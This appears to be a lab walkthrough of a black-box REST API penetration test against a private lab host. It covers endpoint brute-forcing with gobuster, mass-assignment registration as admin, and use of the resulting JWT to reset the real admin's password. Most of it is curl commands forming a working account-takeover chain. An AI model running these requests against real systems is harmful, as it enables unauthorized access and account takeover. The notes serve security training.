### ğŸ” 1. Understanding the Target

- **Web App**: Closed-source, internally developed with REST APIs.
- **REST API**: Common for handling authentication and data ops.
- **Black-box Testing**: No documentation provided â€“ must discover APIs manually.

---
### ğŸš€ 2. Enumerating API Endpoints

- Use **Gobuster** to brute-force API paths:
    ```bash
    gobuster dir -u http://10.10.20.45:8080 -w /usr/share/wordlists/dirb/big.txt -p pattern
    ```
- **Pattern File** Example (`pattern`):
    ```
    {GOBUSTER}/v1
    {GOBUSTER}/v2
    ```
- Common path pattern: `/api_section/v1`

---

### ğŸ“Œ 3. Discovered Endpoints

- `/articles/v1`, `/accounts/v1` â€“ status 200 = valid APIs
- `/dashboard` endpoint revealed **API documentation**

---

### ğŸ§  4. Gathering Sensitive Data

- Inspect endpoint with `curl`:
    ```bash
    curl -i http://10.10.20.45:8080/accounts/v1
    ```
    
- **Found users**: Includes an `admin` account.

---

### ğŸ” 5. Deep Endpoint Discovery

- Brute-force subpaths for admin:
    ```bash
    gobuster dir -u http://10.10.20.45:8080/accounts/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
    ```
    
- Found: `/password`, `/email` (Method Not Allowed = valid endpoints)

---

### ğŸ›‚ 6. Exploring Login Functionality

- Check `/login`:
    ```bash
    curl -i http://10.10.20.45:8080/accounts/v1/login
    ```
    
- Status message: â€œUser not foundâ€ â†’ endpoint exists

---

### ğŸ” 7. Attempt Login via POST

- POST login:
    ```bash
    curl -d '{"password":"test123","username":"admin"}' \
         -H 'Content-Type: application/json' \
         http://10.10.20.45:8080/accounts/v1/login
    ```
    
- Result: Auth fails = parameters are valid
- 
---

### ğŸ†• 8. Try to Register as Admin

- Attempt user registration:
    ```bash
    curl -d '{"password":"test123","username":"pentest","email":"evil@hacker.net","admin":"True"}' \
         -H 'Content-Type: application/json' \
         http://10.10.20.45:8080/accounts/v1/register
    ```
    
- âœ… Registered as **admin** (privilege escalation)

---

### ğŸ”‘ 9. Login With New Admin

```bash
curl -d '{"password":"test123","username":"pentest"}' \
     -H 'Content-Type: application/json' \
     http://10.10.20.45:8080/accounts/v1/login
```

- ğŸ‰ Returned a valid JWT token

---

### ğŸ”„ 10. Change Real Admin Password

- Attempt **PUT** request using the JWT:
    ```bash
    curl -X 'PUT' \
      'http://10.10.20.45:8080/accounts/v1/admin/password' \
      -H 'Content-Type: application/json' \
      -H 'Authorization: OAuth <JWT_TOKEN>' \
      -d '{"password": "owned123"}'
    ```

---

### âœ… 11. Login as Real Admin

```bash
curl -d '{"password":"owned123","username":"admin"}' \
     -H 'Content-Type: application/json' \
     http://10.10.20.45:8080/accounts/v1/login
```

- âœ… Successfully logged in as original **admin**

---

### ğŸ§° 12. Automating with Burp Suite

- Use `--proxy` to capture curl traffic in Burp:
    ```bash
    curl ... --proxy 127.0.0.1:8080
    ```
- From **Repeater**, replay/modify requests.
- **Site Map** helps organize and replay discovered endpoints.

---

## ğŸ“š Key Takeaways

- REST APIs often leak valuable data when misconfigured.
- 405 = exists but wrong method (try POST, PUT, PATCH).
- Privilege escalation via registration is a common dev mistake.
- Burp Suite is great for API analysis, automation, and fuzzing.

---